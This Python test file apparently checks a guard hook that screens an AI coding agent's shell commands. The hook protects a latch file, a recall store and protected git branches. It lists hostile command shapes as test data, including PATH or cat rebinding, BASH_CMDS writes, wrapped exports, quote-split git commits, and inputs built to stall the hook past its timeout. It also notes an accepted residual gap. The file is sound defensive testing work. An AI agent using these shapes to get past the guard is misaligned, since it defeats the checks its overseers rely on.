    # assigns to it (blanks split the word for shlex, not for bash), and in a
    # name `-v` reads.
    "assignment-word-spaced-subscript": "a[PATH = 1]=x",
    "assignment-word-subscript-split-by-a-separator": "a[PATH=1 && 1]=x",
    "bracket-test-names-a-subscript": "[ -v 'a[PATH=1]' ]",
    "double-bracket-test-names-a-subscript": "[[ -v a[PATH=1] ]]",
    "number-test-subscript": "[[ 1 -eq a[b[PATH=1]] ]]",
    # Any mention of the hash array counts, even a read: a command whose name
    # the text does not spell can write an entry.
    "hash-read-only": "echo ${#BASH_CMDS[@]}",
    "hash-written-by-a-computed-read": "\"$(printf %s r e a d)\" 'BASH_CMDS[cat]' <<< /bin/rm",
    # A rebinding builtin behind `command`, and an assignment behind the `time`
    # keyword, run in this shell as they do at the head.
    "command-export": "command export PATH=/tmp/evil:$PATH",
    "command-option-export": "command -p export PATH=/tmp/evil:$PATH",
    "command-builtin-declare": "command builtin declare -x PATH=/tmp/evil",
    "time-assignment": "time PATH=/tmp/evil:$PATH",
    "time-option-assignment": "time -p PATH=/tmp/evil:$PATH",
    "not-time-assignment": "! time PATH=/tmp/evil:$PATH",
    # A nested subscript, and one with blanks in it, which bash reads as one
    # assignment word and shlex splits.
    "nested-subscript-head": "PATH[a[0]]=/tmp/evil",
    "spaced-subscript-head": "PATH[ 0 ]=/tmp/evil",
}
_REBIND_SHAPE_IDS = tuple(_REBIND_SHAPES)

_REBIND_CONTROLS = {
    # A `==` comparison, a string `[[ = ]]`, a `--long-option`, an `name=value`
    # argument to another command, and a harmless `FOO=$(...)`: none rebinds
    # `cat`, `uv` or `python`, so each keeps the read and the exemption.
    "equality": "[[ 1 == 1 ]]",
    "string-compare": '[[ "$x" = y ]]',
    "long-option": "git log --oneline --format=%H",
    "argument-assignment": "git config user.name=x",
    "harmless-substitution": "msg=$(date +%s)",
    # A `=` later in a `${...}` than its operator is text, and a bracket bash
    # does not evaluate as a subscript is no arithmetic.
    "strip-prefix": "echo ${PWD#*=}",
    "strip-suffix": "echo ${line%=*}",
    "default-holds-equals": "echo ${PATTERN:-a=b}",
    "alternative-holds-equals": "echo ${x:+a=b}",
    "replace-equals": "echo ${x/=/-}",
    "character-class": "grep -c 'a[b=c]' /dev/null",
    "glob-bracket": "ls -d foo[x=y]",
    "invert-with-a-class": "grep -vc 'a[b=c]' /dev/null",
    "number-test": '[[ "$1" == --help || $# -eq 0 ]]',
    # `command -v` and `-V` only look a name up, and a program behind
    # `command` or `time` is no builtin.
    "command-lookup": "command -v uv",
    "command-lookup-of-a-builtin": "command -V export",
    "command-runs-a-program": "command ls /dev/null",
    "timed-program": "time -p ls /dev/null",
}
_REBIND_CONTROL_IDS = tuple(_REBIND_CONTROLS)


@pytest.mark.parametrize("name", _REBIND_SHAPE_IDS)
def test_csr_rebind_shape_before_a_latch_read_denies(latch_world: _StoreWorld, name: str) -> None:
    """A rebinding of `cat` before a read of the latch means the `cat <latch>`
    after it is no longer a read the guard can vouch for, so it is denied."""
    command = f"{_REBIND_SHAPES[name]}; cat {latch_world.latch.as_posix()}"
    _assert_latch_denied(*_bash(latch_world, command), latch_world.latch)


@pytest.mark.parametrize("name", _REBIND_SHAPE_IDS)
def test_csr_rebind_shape_refuses_the_recall_exemption(store_world: _StoreWorld, name: str) -> None:
    """A rebinding of `uv` or `python` anywhere in the command refuses the
    recall-script exemption, so the pinned call that names the store is denied."""
    command = f"{_REBIND_SHAPES[name]}; {_exempt_filter(store_world)}"
    reason = _assert_latch_denied(*_bash(store_world, command), store_world.latch)
    assert "names the recall store" in reason


@pytest.mark.parametrize("name", _REBIND_CONTROL_IDS)
def test_csr_rebind_control_keeps_the_latch_read(latch_world: _StoreWorld, name: str) -> None:
    """Controls: a comparison, a long option and an argument assignment do not
    rebind, so a read of the latch beside them stays a read and passes."""
    command = f"{_REBIND_CONTROLS[name]}; cat {latch_world.latch.as_posix()}"
    _assert_allowed(*_bash(latch_world, command))


@pytest.mark.parametrize("name", _REBIND_CONTROL_IDS)
def test_csr_rebind_control_keeps_the_recall_exemption(store_world: _StoreWorld, name: str) -> None:
    """The same controls keep the recall-script exemption."""
    command = f"{_REBIND_CONTROLS[name]}; {_exempt_filter(store_world)}"
    _assert_allowed(*_bash(store_world, command))


@pytest.mark.parametrize(
    "read",
    [
        "cat {latch}; echo ${{PWD#*=}}",
        "cat {latch}; echo ${{line%=*}}",
        "cat {latch}; echo ${{x/=/-}}",
        "grep ${{PATTERN:-a=b}} {latch}",
        "grep -- ${{FLAG:-PATH=x}} {latch}",
        "grep 'a[b=c]' {latch}",
        "grep foo[x=y] {latch}",
        "grep -v 'a[b=c]' {latch}",
        "[ -f {latch} ] && grep 'a[b=c]' {latch}",
    ],
    ids=[
        "strip-prefix",
        "strip-suffix",
        "replace",
        "default",
        "default-names-path",
        "character-class",
        "glob-bracket",
        "inverted-class",
        "test-then-class",
    ],
)
def test_csr_read_beside_text_that_assigns_nothing_passes(latch_world: _StoreWorld, read: str) -> None:
    """False positives of the widened rebinding reading: a `=` later in a
    `${...}` than its operator, and a bracket bash does not evaluate as a
    subscript (a grep character class or a glob), assign nothing, so a read
    of the latch beside or around them stays a read."""
    _assert_allowed(*_bash(latch_world, read.format(latch=latch_world.latch.as_posix())))


def test_csr_hash_array_mention_is_kept_fail_closed(latch_world: _StoreWorld, tmp_path: Path) -> None:
    """Decision: any mention of `BASH_CMDS` or `BASH_ALIASES` keeps counting,
    a read-only one too. A command whose name the text does not spell can
    write an entry (bash runs `read` here and maps `cat` to `rm`), and the
    array's name is all the text shows of it. Twin: count only the assignment
    forms, and that write passes as a read of the latch, while the read-only
    mention the decision costs passes too."""
    latch = latch_world.latch.as_posix()
    computed = f"\"$(printf %s r e a d)\" 'BASH_CMDS[cat]' <<< /bin/rm; cat {latch}"
    read_only = f"grep BASH_CMDS {latch}"
    _assert_latch_denied(*_bash(latch_world, computed), latch_world.latch)
    _assert_latch_denied(*_bash(latch_world, read_only), latch_world.latch)

    mutant = _write_mutant(
        tmp_path,
        "hash_writes_only",
        r"(?<![A-Za-z0-9_])BASH_(?:CMDS|ALIASES)(?![A-Za-z0-9_])",
        r"(?<![A-Za-z0-9_])BASH_(?:CMDS|ALIASES)(?:\[[^]]*\])?[+:]?=",
    )
    _assert_allowed(*_bash(latch_world, computed, hook=mutant))
    _assert_allowed(*_bash(latch_world, read_only, hook=mutant))
    assigned = f"BASH_CMDS[cat]=/bin/rm; cat {latch}"
    _assert_latch_denied(*_bash(latch_world, assigned, hook=mutant), latch_world.latch)


_OPERATOR_CHECK = '        if command.startswith(("=", ":="), after):\n            return True\n'
_SUBSTRING_SPAN = "            spaced.append((after + 1, braces[match.start() + 1]))\n"
_ASSIGNED_SUBSCRIPT = '        if command.startswith(("=", "+="), close + 1):\n'
_NAME_TEST_PIECE = (
    "        if _TEST_COMMAND.search(command, start, end) and _NAME_OPERAND.search(command, start, end):\n"
)


@pytest.mark.parametrize(
    "name,old,new,shape",
    [
        ("no_operator", _OPERATOR_CHECK, "", ": ${{!x:=/tmp/evil}}; cat {latch}"),
        ("no_substring", _SUBSTRING_SPAN, "            pass\n", "echo ${{PWD:PATH=1}}; cat {latch}"),
        ("no_assigned_subscript", _ASSIGNED_SUBSCRIPT, "        if False:\n", "a[PATH=1 && 1]=x; cat {latch}"),
        ("no_name_test", _NAME_TEST_PIECE, "        if False:\n", "test -v 'a[PATH=1]'; cat {latch}"),
    ],
    ids=["assigning-operator", "substring", "assignment-word", "minus-v"],
)
def test_mutant_without_an_arithmetic_span_a_rebinding_reads_as_a_read(
    latch_world: _StoreWorld, tmp_path: Path, name: str, old: str, new: str, shape: str
) -> None:
    """Twins of the spans the narrowed reading still finds: drop one and a
    command that assigns PATH (or, through `${!x:=...}`, whatever `x` names)
    before `cat <latch>` passes as a read; with it, the read is denied."""
    mutant = _write_mutant(tmp_path, name, old, new)
    command = shape.format(latch=latch_world.latch.as_posix())

    _assert_allowed(*_bash(latch_world, command, hook=mutant))
    _assert_latch_denied(*_bash(latch_world, command), latch_world.latch)


@pytest.mark.parametrize(
    "name,old,new,shape",
    [
        (
            "no_wrapper_peel",
            "        if head not in _CURRENT_SHELL_WRAPPERS:\n",
            "        if True:\n",
            "command export PATH=/tmp/evil:$PATH; cat {latch}",
        ),
        (
            "no_wrapper_peel_for_time",
            "        if head not in _CURRENT_SHELL_WRAPPERS:\n",
            "        if True:\n",
            "time PATH=/tmp/evil:$PATH; cat {latch}",
        ),
        (
            "no_joined_subscript",
            "    if _OPEN_SUBSCRIPT_HEAD.match(head) and",
            "    if False and",
            "PATH[ 0 ]=/tmp/evil; cat {latch}",
        ),
        (
            "flat_subscript",
            r'(?:\[.*\])?\+?=")',
            r'(?:\[[^\]]*\])?\+?=")',
            "PATH[a[0]]=/tmp/evil; cat {latch}",
        ),
    ],
    ids=["command", "time", "spaced-subscript", "nested-subscript"],
)
def test_mutant_without_the_head_forms_a_rebinding_reads_as_a_read(
    latch_world: _StoreWorld, tmp_path: Path, name: str, old: str, new: str, shape: str
) -> None:
    """Twins of the head forms behind a wrapper or in a subscript bash reads as
    one word: drop one and a command that assigns PATH before `cat <latch>`
    passes as a read; with it, the read is denied."""
    mutant = _write_mutant(tmp_path, name, old, new)
    command = shape.format(latch=latch_world.latch.as_posix())

    _assert_allowed(*_bash(latch_world, command, hook=mutant))
    _assert_latch_denied(*_bash(latch_world, command), latch_world.latch)


def test_mutant_without_the_lookup_case_refuses_command_v(latch_world: _StoreWorld, tmp_path: Path) -> None:
    """Twin of `command -v`: read its operand as a head, and a lookup of a
    builtin's name before `cat <latch>` is refused; it runs nothing, so it
    passes."""
    mutant = _write_mutant(
        tmp_path,
        "no_lookup_case",
        '            if head == "command" and ("v" in option or "V" in option):\n                return False\n',
        "",
    )
    command = f"command -V export; cat {latch_world.latch.as_posix()}"

    _assert_latch_denied(*_bash(latch_world, command, hook=mutant), latch_world.latch)
    _assert_allowed(*_bash(latch_world, command))


def test_mutant_every_bracket_a_subscript_refuses_a_character_class(latch_world: _StoreWorld, tmp_path: Path) -> None:
    """Twin of the subscript gate: read every `NAME[...]` as a subscript bash
    evaluates, as the reading did before, and `grep 'a[b=c]' <latch>` is
    refused; the gate is what lets it through, while a real assignment word
    with a mutating subscript is refused either way."""
    mutant = _write_mutant(tmp_path, "every_bracket", _ASSIGNED_SUBSCRIPT, "        if True:\n")
    latch = latch_world.latch.as_posix()
    read = f"grep 'a[b=c]' {latch}"

    _assert_latch_denied(*_bash(latch_world, read, hook=mutant), latch_world.latch)
    _assert_allowed(*_bash(latch_world, read))
    _assert_latch_denied(*_bash(latch_world, f"a[PATH=1]=x; cat {latch}"), latch_world.latch)


@pytest.mark.parametrize(
    "command,expected",
    [
        ("echo ${PWD#*=}\ncat > f <<'EOF'\nrm x\nEOF", "echo ${PWD#*=}\ncat > f <<'EOF'\n"),
        ("echo ${x:-a=b} ${x/=/-}\ncat > f <<'EOF'\nrm x\nEOF", "echo ${x:-a=b} ${x/=/-}\ncat > f <<'EOF'\n"),
        (": ${x:=1}\ncat <<'EOF'\nrm x\nEOF", None),
        (": ${!x=1}\ncat <<'EOF'\nrm x\nEOF", None),
        ("echo ${PWD:PATH=1}\ncat <<'EOF'\nrm x\nEOF", None),
        ("echo ${a[ PATH = 1 ]}\ncat <<'EOF'\nrm x\nEOF", None),
    ],
    ids=[
        "strip-before",
        "default-and-replace-before",
        "default-assigns-before",
        "indirect-assigns-before",
        "substring-assigns-before",
        "subscript-assigns-before",
    ],
)
def test_csr_heredoc_lookup_change_reads_a_parameter_expansion_by_its_operator(
    guard_module, command: str, expected: str | None
) -> None:
    """The heredoc path's `${...}` check is narrowed as the read path's is: a
    `${...}` before a sink keeps its body only when it assigns, by its operator
    or in arithmetic, and a `=` later in one does not. (Any `NAME=` before a
    sink still keeps it there, quotes or not: the heredoc path's own rule.)"""
    assert guard_module._without_heredoc_data(command) == (command if expected is None else expected)


def test_csr_heredoc_report_after_a_strip_expansion_passes(latch_world: _StoreWorld) -> None:
    """End to end on the heredoc path: a report appended from the latch's own
    folder after a `${PWD#*=}` keeps its body data, so its `.**` passes; after
    a `${x:=...}` the body is read, and the `.**` names the latch."""
    report = f"cat >> {_report(latch_world)} <<'EOF'\n{_REPORT_BODY}EOF"
    _assert_allowed(*_bash(latch_world, f"echo ${{PWD#*=}}\n{report}", cwd=latch_world.impl))
    _assert_latch_denied(*_bash(latch_world, f": ${{x:=1}}\n{report}", cwd=latch_world.impl), latch_world.latch)


def test_csr_rebinding_text_is_linear_in_the_command_length(guard_module) -> None:
    """The text scan for rebinding shapes once took time quadratic in the
    command's length: a `[[ ]]` test read lazily to its `]]` from every `[[`,
    a subscript tried from every letter of a long word, and a `${...}` or a
    `PATH[` read to the end from each opener. A hook past its timeout lets
    the call through, so the scan pairs brackets and braces in one pass now.
    The bound is generous: each input took tens of seconds to minutes before."""
    import time

    inputs = (
        "[[ -eq " * 50000,
        "a" * 200000,
        "${" * 100000,
        " PATH[" * 50000,
        "${a[" * 50000,
        "test -v a[" * 30000,
    )
    start = time.perf_counter()
    for text in inputs:
        guard_module._rebinding_text(text)
    elapsed = time.perf_counter() - start
    assert elapsed < 10.0, f"took {elapsed:.1f}s"


def test_csr_a_run_of_wrappers_is_bounded(guard_module) -> None:
    """Each wrapper ahead of a head makes the scan re-read the rest of its
    segment, so the scan reads at most _MAX_WRAPPERS of them and counts a
    longer run as a rebind: a long run once took time quadratic in its length,
    and a hook past its timeout lets the call through. A short run is read
    through to its head."""
    import time

    limit = guard_module._MAX_WRAPPERS
    assert not guard_module._command_rebinds("time " * limit + "ls")
    assert guard_module._command_rebinds("time " * (limit + 1) + "ls")
    start = time.perf_counter()
    assert guard_module._command_rebinds("time -p " * 50000 + "ls")
    assert guard_module._command_rebinds("command " * 50000 + "ls")
    elapsed = time.perf_counter() - start
    assert elapsed < 10.0, f"took {elapsed:.1f}s"


def test_csr_rebinding_prose_matches_the_reading() -> None:
    """SECURITY.md, the change fragment and the guard's comment say what the
    reading does: a `${...}` counts by its operator, not for any `=` in it; a
    read-only mention of the hash array still counts, by decision; and a
    bracket bash does not evaluate is no subscript."""
    security = (_REPO_ROOT / "SECURITY.md").read_text(encoding="utf-8")
    assert "a `${...}` that holds a `=`" not in security
    assert "a `${...}` that assigns, and any `NAME=` or `NAME[...]=`" in security
    assert "any mention of `BASH_CMDS` or `BASH_ALIASES`, even one that only reads them" in security
    assert "a `${...}` whose operator assigns, a `=` or `:=` right after the name and any subscript" in security
    assert "A `=` later in a `${...}` than its operator (`${PWD#*=}`, `${x:-a=b}`)" in security
    assert "the character class in `grep 'a[b=c]'`" in security
    assert "a rebinding builtin behind `command`, and an assignment behind the `time` keyword" in security
    assert "though `command -v` and `-V` only look a name up" in security
    assert "an assignment word whose subscript nests or holds blanks (`PATH[a[0]]=...`, `PATH[ 0 ]=...`)" in security
    assert "a command name built at run time (`$(echo export) PATH=...`)" in security
    assert "a value that only reaches arithmetic at run time" in security

    fragment = (_REPO_ROOT / "changes" / "guard-rebinds-arithmetic-and-substitution.yaml").read_text(encoding="utf-8")
    assert "a `BASH_CMDS` or `BASH_ALIASES` entry" not in fragment
    assert "(`grep BASH_CMDS <latch>`) is refused too" in fragment
    assert "a bracket that is no subscript (`grep 'a[b=c]' <latch>`) still pass" in fragment
    assert "a rebinding builtin behind `command` and an assignment behind `time`" in fragment
    assert "a command name built at run time, and a value that only reaches arithmetic at run time" in fragment

    source = HOOK.read_text(encoding="utf-8")
    assert "a `${...}` that holds\n#     a `=` assigns" not in source
    assert "it (`${PWD#*=}`, `${line%=*}`, `${x:-a=b}`, `${x/=/-}`) is only text." in source


def test_csr_heredoc_reading_is_linear_in_the_number_of_heredocs(guard_module) -> None:
    """Issue finding on #176's reading: reading the command without its data
    bodies once took time quadratic in the heredoc count, because each sink
    re-scanned the whole growing prefix. It is linear now, so a command with a
    few thousand data heredocs and a trailing `rm <latch>` resolves fast. The
    bound is generous: a regression to the quadratic cost took tens of seconds
    at this size."""
    import time

    command = "".join(f"cat >>f{i} <<'EOF'\nrow .**\nEOF\n" for i in range(2000))
    command += "rm -f _bmad-output/implementation-artifacts/.mem-state.json"
    guard_module._without_heredoc_data.cache_clear()
    start = time.perf_counter()
    read = guard_module._without_heredoc_data(command)
    elapsed = time.perf_counter() - start
    assert elapsed < 10.0, f"took {elapsed:.1f}s"
    # The trailing `rm` is kept (the data bodies are left out), so the command
    # still names the latch and would be denied.
    assert "rm -f _bmad-output/implementation-artifacts/.mem-state.json" in read


def test_csr_process_substitution_inside_a_quoted_body_is_data(latch_world: _StoreWorld) -> None:
    """The section comment says a `<(` or `>(` OUTSIDE the bodies keeps every
    body; one inside a quoted data body does not, since bash runs none of that
    body. The `<(x)` here is data, so the report passes, while the same text
    outside a body keeps the body and is read as commands."""
    latch = latch_world.latch.as_posix()
    inside = f"cat >> {_report(latch_world)} <<'EOF'\n<(x) {latch}\nEOF"
    _assert_allowed(*_bash(latch_world, inside, cwd=latch_world.impl))
    # A `<(` outside the body, even inside single quotes, keeps every body, so
    # the latch named in the kept body is read as a command and denied.
    outside = f"echo '<(x)'\ncat >> {_report(latch_world)} <<'EOF'\n{latch}\nEOF"
    _assert_latch_denied(*_bash(latch_world, outside, cwd=latch_world.impl), latch_world.latch)


def test_csr_a_cat_body_written_to_a_file_another_command_runs_is_a_residual(latch_world: _StoreWorld) -> None:
    """Accepted residual, now disclosed in the fragment: a body `cat` or `tee`
    writes to a file is not read, even when the same command then runs that
    file. A FIFO reader that starts first reads it too, so the comment says
    `another command`, not `a later command`."""
    latch = latch_world.latch.as_posix()
    script = (latch_world.tmp / "s.sh").as_posix()
    written_then_run = f"cat > {script} <<'EOF'\nrm -f {latch}\nEOF\nsh {script}"
    _assert_allowed(*_bash(latch_world, written_then_run, cwd=latch_world.impl))


def test_csr_heredoc_section_comment_and_fragment_match_the_reading() -> None:
    """Findings 4 and 5: the guard's section comment and the change fragment
    describe the reading as the code performs it. A `<(`/`>(` OUTSIDE the
    bodies keeps every body, not a process substitution anywhere; the
    write-then-run residual names `another command`, not only a later one; and
    the fragment discloses the written-file residual and points at SECURITY.md."""
    source = HOOK.read_text(encoding="utf-8")
    assert "A `<(` or `>(` outside the bodies, even inside quotes, keeps every body." in source
    assert "process substitution anywhere keeps every body" not in source
    assert "a body written to a file that another command runs" in source
    assert "a later command runs" not in source

    fragment = (_REPO_ROOT / "changes" / "guard-heredoc-data.yaml").read_text(encoding="utf-8")
    assert "a `<(` or `>(` outside its heredoc bodies" in fragment
    assert "process substitution" not in fragment
    assert "A body that `cat` or `tee` writes to a file is no longer read" in fragment
    assert "the other indirection limits" in fragment


# --- SECURITY.md (CSR-UNIT-042) ------------------------------------------------


def test_csr_security_md_carries_the_left_behind_latch_caveat() -> None:
    """CSR-UNIT-042 (AC-13, AC-33): invariant 6 says a dead run's latch keeps
    denying until the next Stage 1 or its deletion by hand, and that each run
    removes its own with `unlatch`; invariant 7 carries the latch-file
    protection of decision 11, its reader list equal to the guard's; and the
    count matches the guard's docstring (seven invariants)."""
    text = (_REPO_ROOT / "SECURITY.md").read_text(encoding="utf-8")
    assert "It enforces seven invariants:" in text
    invariants = [line.strip() for line in text.splitlines() if re.match(r"\s+\d\. ", line)]
    assert [line[:2] for line in invariants] == ["1.", "2.", "3.", "4.", "5.", "6.", "7."]
    sixth = invariants[5]
    assert "left behind" in sixth
    assert "Stage 1" in sixth
    assert "delete it by hand" in sixth
    assert "`mem_recall.py unlatch`" in sixth
    assert "not to remove the latch itself" in sixth
    assert "changing the latch file" in invariants[6]
    reader_line = next(line for line in text.splitlines() if "- its command is `" in line)
    listed = re.findall(r"`([^`]+)`", reader_line.split(", by that bare name")[0])
    module = _load_guard_module()
    assert set(listed) == set(module._LATCH_READERS)
    doc = module.__doc__
    assert "  7. Cross-Session Recall, local run store" in doc
    assert "latch file" in doc


# --- #179: long runs of one shell word ----------------------------------------
# The leading-noise strip dropped one word per pass and copied the rest each
# time, so a long run of `!` cost time quadratic in its length; and each exec
# wrapper ahead of a head was read by a recursive call, so a long run of them
# overflowed Python's recursion limit. A hook past its timeout, and a hook that
# exits on an exception, both make no decision, and the command goes through.


def _quadratic_strip(guard, tokens: list[str]) -> list[str]:
    """The leading-noise strip as 3.2.0 shipped it, one word per pass with a
    copy each time: the reference the linear strip must match word for word."""
    while True:
        index = 0
        while index < len(tokens) and guard._ASSIGNMENT.match(tokens[index]):
            index += 1
        stripped = tokens[index:]
        if stripped:
            head = stripped[0]
            bare = head.lstrip(guard._GROUP_OPENERS)
            redirect = guard._REDIRECTION.match(head)
            if bare != head:
                stripped = ([bare] + stripped[1:]) if bare else stripped[1:]
            elif head == "function" and len(stripped) > 1:
                stripped = stripped[2:]
            elif head == "coproc" and len(stripped) > 2 and stripped[2] in ("{", "("):
                stripped = stripped[2:]
            elif head.lower() in guard._SHELL_KEYWORDS:
                stripped = stripped[1:]
            elif redirect:
                alone = redirect.end() == len(head)
                target_is_git = alone and len(stripped) > 1 and os.path.basename(stripped[1]).lower() == "git"
                stripped = stripped[2:] if alone and not target_is_git else stripped[1:]
            elif head.isdigit() and len(stripped) > 1 and guard._REDIRECTION.match(stripped[1]):
                stripped = stripped[1:]
        if stripped == tokens:
            return stripped
        tokens = stripped


# One word of each kind the strip reads, in the spellings that change its
# path: keywords in either case, openers alone, glued and nested, assignments,
# `function` and `coproc` with what follows them, redirections alone and
# glued, descriptors, and the heads it must stop at.
_STRIP_VOCABULARY = (
    "", "!", "if", "IF", "then", "fi", "do", "done", "{", "}", "(", ")", "((", "({", "(git", "({git",
    "{(", "FOO=1", "(FOO=1", "{FOO=", "a=b", "=x", "function", "Function", "f", "coproc", "Coproc",
    ">", ">>", "2>&1", ">out", "2", "12", ">&", "2>&", "<<", "<<<", "<", "&>", ">|", "<>", "<&",
    "git", "/usr/bin/git", "GIT", "commit", "ls", "time", "env", "-p", "--",
)


def test_the_linear_strip_reads_every_word_list_as_the_quadratic_one_did(guard_module) -> None:
    """Issue #179: the strip moves an index now, and returns exactly what the
    3.2.0 strip returned: every list of up to three words over the vocabulary,
    and seeded random lists of four to twelve, without changing its input."""
    import itertools
    import random

    lists: list[list[str]] = [
        list(words) for size in range(4) for words in itertools.product(_STRIP_VOCABULARY, repeat=size)
    ]
    rng = random.Random(179)
    lists += [[rng.choice(_STRIP_VOCABULARY) for _ in range(rng.randint(4, 12))] for _ in range(20_000)]
    for words in lists:
        before = list(words)
        assert guard_module._strip_leading_noise(words) == _quadratic_strip(guard_module, list(words)), words
        assert words == before, words


def test_a_run_of_bang_words_is_linear(guard_module) -> None:
    """Issue #179: a segment opening with n `!` words cost time quadratic in
    n, and a hook past its timeout lets the call through. The bound is
    generous: at this size the strip, the git reading and the rebinding scan
    took tens of seconds before, and a second or two now."""
    import time

    n = 50_000
    start = time.perf_counter()
    assert guard_module._strip_leading_noise(["!"] * n + ["git", "x"]) == ["git", "x"]
    assert guard_module._git_writes("! " * n + _V + " -m x") == {"commit"}
    assert not guard_module._command_rebinds("! " * n + "ls")
    elapsed = time.perf_counter() - start
    assert elapsed < 10.0, f"took {elapsed:.1f}s"


def test_a_short_run_of_exec_wrappers_is_read_through(guard_module) -> None:
    """The bound reaches no further than it must: a run of _MAX_WRAPPERS
    wrappers is read through to its head, whether that is a git write or a
    command that is no git."""
    limit = guard_module._MAX_WRAPPERS
    assert guard_module._git_writes("env " * limit + _V + " -m x") == {"commit"}
    assert guard_module._git_writes("nice -n 1 " * limit + _V + " -m x") == {"commit"}
    assert guard_module._git_writes("env " * limit + "ls") == set()
    assert guard_module._git_writes("sudo -u u " * limit + "git status") == set()


def test_a_long_run_of_exec_wrappers_fails_closed(tmp_path: Path, guard_module) -> None:
    """Issue #179 follow-up: each exec wrapper ahead of the head was read by a
    recursive call, so a run of about a thousand (`env env ... git commit`)
    overflowed Python's recursion limit, the hook exited 1 with no decision
    and the commit went through every git gate. The wrappers are read in a
    bounded loop now, and past _MAX_WRAPPERS the segment counts as both verbs,
    whatever follows them."""
    protected = _protected_repo(tmp_path)
    code, out = _run_hook(_bash_event(protected, "env " * 2000 + _V + " -m x"), protected)
    assert code == 2
    assert "Protected-branch" in _reason(out)

    limit = guard_module._MAX_WRAPPERS
    assert guard_module._git_writes("env " * (limit + 1) + _V + " -m x") == {"commit", "push"}
    assert guard_module._git_writes("nice " * 5000 + _V + " -m x") == {"commit", "push"}
    assert guard_module._git_writes("sudo -u u " * 5000 + "git status") == {"commit", "push"}
    assert guard_module._git_writes("env " * (limit + 1) + "ls") == {"commit", "push"}
    assert guard_module._git_writes("env " * (limit + 1)) == {"commit", "push"}


# What a run of wrappers can run: a git that bash spells only once it removes
# quotes or a backslash, behind a nested shell, an `eval` or as the head itself
# (`GIT` runs git on a case-insensitive file system), a literal git write or
# read, and commands that are no git. The 3.2.0 reading, a recursion, read each
# of them through any number of wrappers, until about a thousand overflowed it.
_BEHIND_WRAPPERS = (
    "bash -c 'g\"\"it commit -m x'",
    "bash -c 'g\\it commit -m x'",
    "bash -c 'gi\"\"t push origin main'",
    "eval 'g\"\"it commit -m x'",
    "eval 'g\"\"it ci'",
    "G''IT commit -m x",
    "bash -c 'git commit -m x'",
    _V + " -m x",
    "git push",
    "git status",
    "ls",
    "",
)


@pytest.mark.parametrize("wrapper", ["env ", "command ", "nice -n 1 ", "sudo -u u "])
def test_the_wrapper_bound_reads_no_write_as_less(guard_module, wrapper: str) -> None:
    """Every command the unbounded reading denied is still denied. Within the
    bound a run of wrappers reads as one wrapper does; past it the segment
    counts as both verbs, a superset of what one wrapper reads. The bound's
    first form searched the words past it for a literal `git`, so a git bash
    spells only once it removes quotes read as no write there, and a commit
    the unbounded reading denied went through."""
    limit = guard_module._MAX_WRAPPERS
    for payload in _BEHIND_WRAPPERS:
        one = guard_module._git_writes(wrapper + payload)
        for n in (2, limit):
            assert guard_module._git_writes(wrapper * n + payload) == one, (n, payload)
        for n in (limit + 1, limit + 2, 100, 990):
            assert guard_module._git_writes(wrapper * n + payload) == {"commit", "push"}, (n, payload)


def test_past_the_wrapper_bound_a_git_bash_unquotes_is_denied(tmp_path: Path, guard_module) -> None:
    """Through the real hook: one wrapper past the bound, a commit or push whose
    git bash spells only once it removes quotes is denied on a protected
    branch, as the unbounded reading denied it."""
    protected = _protected_repo(tmp_path)
    over = guard_module._MAX_WRAPPERS + 1
    for command in ("env " * over + "bash -c 'g\"\"it commit -m x'", "command " * over + "eval 'g\"\"it push'"):
        code, out = _run_hook(_bash_event(protected, command), protected)
        assert code == 2, command
        assert "Protected-branch" in _reason(out)


# The bound's verdict, and its first form's: a search of the unread words for a
# literal `git`, which hands a segment without one to the matches-anywhere
# scan.
_WRAPPER_BOUND_VERDICT = "        if wrappers > _MAX_WRAPPERS:\n            return set(_UNRESOLVED_VERBS)\n"
_WRAPPER_BOUND_GIT_SEARCH = (
    "        if wrappers > _MAX_WRAPPERS:\n"
    "            return set(_UNRESOLVED_VERBS) if any(_GIT_WORD.search(t) for t in tokens) else None\n"
)


def test_mutant_searching_past_the_bound_for_a_git_lets_the_commit_through(tmp_path: Path, guard_module) -> None:
    """Twin: past the bound, search the unread words for a `git` instead of
    counting both verbs, and the protected-branch commit above goes through."""
    mutant = _write_mutant(tmp_path, "bound_git_search", _WRAPPER_BOUND_VERDICT, _WRAPPER_BOUND_GIT_SEARCH)
    protected = _protected_repo(tmp_path)
    command = "env " * (guard_module._MAX_WRAPPERS + 1) + "bash -c 'g\"\"it commit -m x'"
    code, out = _run_mutant_hook(mutant, _bash_event(protected, command), protected)
    assert code == 0
    assert out is None


def test_a_run_past_the_wrapper_bound_is_read_in_linear_time(guard_module) -> None:
    """The bound's first form handed a run past it with no `git` word left in
    it to the matches-anywhere scan, which restarts at every `git` word in
    the segment, so `--git` words ahead of the run cost time quadratic in
    their number (tens of seconds at this size) where the unbounded reading
    took linear time. Past the bound the reading decides on its own now."""
    import time

    command = "env" + " --git" * 8000 + " env" * (guard_module._MAX_WRAPPERS + 1) + " ls"
    start = time.perf_counter()
    assert guard_module._git_writes(command) == {"commit", "push"}
    elapsed = time.perf_counter() - start
    assert elapsed < 10.0, f"took {elapsed:.1f}s"


def test_the_wrapper_bound_is_one_constant_beside_the_wrappers(guard_module) -> None:
    """The git reading and the rebinding scan read one bound, defined with the
    wrappers it bounds, not in the recall section."""
    source = HOOK.read_text(encoding="utf-8")
    assert source.count("\n_MAX_WRAPPERS = ") == 1
    assert source.index("\n_EXEC_WRAPPERS = ") < source.index("\n_MAX_WRAPPERS = ")
    assert source.index("\n_MAX_WRAPPERS = ") < source.index("\n_SHELL_WRAPPERS = ")
    assert guard_module._MAX_WRAPPERS == 32


# A classifier that raises: the shape of any exception left on the git path.
_CLASSIFY_BODY = (
    "    scope = _CommandScope(command)\n"
    "    return _command_write_verbs(command, 0, scope), list(scope.unknown)\n"
)
_CLASSIFY_RAISES = '    raise LookupError("mutant: the classifier raised")\n'
_CLASSIFY_CALL = "        verbs, unknown = _classify(command)\n"


def _classify_catch(src: str) -> str:
    """The try/except around the classifier in main(), exactly as it sits there."""
    start = src.index("    try:\n" + _CLASSIFY_CALL)
    end = src.index("    if not verbs:\n", start)
    return src[start:end]


def test_a_command_the_guard_cannot_classify_is_denied(tmp_path: Path) -> None:
    """A classifier that raises would end the hook with no decision, and the
    command would go through every git gate; the guard denies it instead,
    whatever it holds and whatever branch it runs on, and names the error."""
    mutant = _write_mutant(tmp_path, "classify_raises", _CLASSIFY_BODY, _CLASSIFY_RAISES)
    repo, impl = _green_story_repo(tmp_path, stage=True)
    env = {"ULTRACODE_IMPL_ARTIFACTS": str(impl)}
    for command in (_V + " -m x", "git status"):
